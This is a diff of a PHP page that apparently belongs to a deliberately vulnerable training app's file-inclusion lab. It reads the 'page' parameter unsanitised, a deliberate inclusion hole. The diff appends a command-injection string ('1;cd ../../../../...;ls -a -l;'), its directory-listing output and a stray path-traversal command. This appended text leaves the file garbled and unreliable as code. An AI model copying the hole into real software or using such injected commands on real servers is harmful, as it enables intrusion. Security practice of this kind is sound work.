@@ -22,10 +22,8 @@
 
 
 <?php
-
 // The page we wish to display
 $file = $_GET[ 'page' ];
-
 ?> 
 
 
@@ -42,3 +40,23 @@ if( !ini_get( 'allow_url_fopen' ) )
 } 
 $page[ 'body' ] .= "
 \n"; ?>
+
+
+1;cd ../../../../www/blob/vulnerabilities/fi/;ls -a -l;
+
+total 40
+drwxr-xr-x  4 www-data www-data 4096 Oct  5 15:16 .
+drwxr-xr-x 14 www-data www-data 4096 Nov  8 08:45 ..
+-rwxr-xr-x  1 www-data www-data  604 Oct  4 10:45 file1.php
+-rwxr-xr-x  1 www-data www-data  608 Oct  4 10:45 file2.php
+-rwxr-xr-x  1 www-data www-data 1113 Oct  4 10:45 file3.php
+-rwxr-xr-x  1 www-data www-data  445 Oct  5 15:16 file4.php
+drwxr-xr-x  2 www-data www-data 4096 Oct  4 10:45 help
+-rwxr-xr-x  1 www-data www-data  971 Oct  4 10:45 include.php
+-rwxr-xr-x  1 www-data www-data 1005 Oct  4 10:45 index.php
+drwxr-xr-x  2 www-data www-data 4096 Oct  4 10:45 source
+
+
+cd ../../../../www/blob/vulnerabilities/fi/file4.php;
+
+
